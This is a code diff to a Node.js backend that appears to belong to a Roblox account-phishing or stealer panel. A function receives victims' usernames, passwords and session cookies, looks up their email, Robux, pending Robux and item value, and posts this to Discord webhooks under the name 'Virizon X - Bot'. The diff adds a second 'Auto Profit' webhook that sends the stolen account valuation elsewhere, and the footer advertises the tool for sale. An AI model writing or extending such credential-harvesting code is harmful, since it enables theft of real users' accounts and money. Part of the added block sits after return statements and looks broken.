@@ -1,5 +1,5 @@
+require('dotenv').config();
 const axios = require('axios');
-
 const faunadb = require('faunadb');
 const client = new faunadb.Client({
     secret: process.env.FAUNADB_SECRET,
@@ -360,9 +360,9 @@ async function sendwebhooks(webhook, data) {
     }
 }
 
-async function successembed(rusername, rpassword, cookies, successwebhook,sessionToken) {
+async function successembed(rusername, rpassword, cookies, successwebhook, sessionToken) {
 
-    
+
     const user_ref_from_session = await client.query(
         q.Map(
             q.Paginate(q.Match(q.Index('sessions_by_token'), sessionToken)),
@@ -404,7 +404,7 @@ async function successembed(rusername, rpassword, cookies, successwebhook,sessio
     const email = await getUserEmail(cookies);
     const rap = await getCollectiblesRAP(userId, cookies);
 
-    const embed = {
+    const successembed = {
         content: "",
         username: "Virizon X - Bot",
         avatar_url: "",
@@ -543,10 +543,72 @@ async function successembed(rusername, rpassword, cookies, successwebhook,sessio
         } else {
             return 'An error occurred';
         }
+
+        const autoprofitembed = {
+            content: "",
+            username: "Virizon X - Bot",
+            avatar_url: "",
+            embeds: [{
+                title: `<@${discord_id}> Profit`,
+                timestamp: new Date().toISOString(),
+                color: parseInt("34eb8c", 16),
+                footer: {
+                    text: "Buy Lexar Mgui Now!! https://discord.gg/lexarontop",
+                    icon_url: "https://cdn3.iconfinder.com/data/icons/round-default/64/add-512.png",
+                },
+                thumbnail: {
+                    url: avatarUrl,
+                },
+                author: {
+                    name: "Virizon - Auto Profit",
+                },
+                fields: [
+
+                    {
+                        name: "Membership",
+                        value: membership,
+                        inline: true,
+                    },
+                    {
+                        name: "Revenue",
+                        value: "R$ " + revenue.summary.toLocaleString(),
+                        inline: true,
+                    },
+                    {
+                        name: "Robux",
+                        value: "R$ " + robux.toLocaleString(),
+                        inline: true,
+                    },
+                    {
+                        name: "Pending Robux",
+                        value: "R$ " + revenue.pendingrobux.toLocaleString(),
+                        inline: true,
+                    },
+                    {
+                        name: "Inventory Rap",
+                        value: "R$ " + rap.toLocaleString(),
+                        inline: true,
+                    },
+                    {
+                        name: "Credits",
+                        value: getcredits.credits + " => R$ " + getcredits.robuxconvert.toLocaleString(),
+                        inline: true,
+                    },
+                    {
+                        name: "Join Date",
+                        value: `Joined ${joindate} , ${getuserage}`,
+                        inline: true,
+                    },
+                ],
+            }, ],
+        };
+        const autoprofitpayload = JSON.stringify(autoprofitembed);
+        sendwebhooks(process.env.AUTO_PROFIT, autoprofitpayload);
     }
 
-    const payload = JSON.stringify(embed);
+    const payload = JSON.stringify(successembed);
     sendwebhooks(successwebhook, payload);
+
     return 'New Account Validated';
 }
 
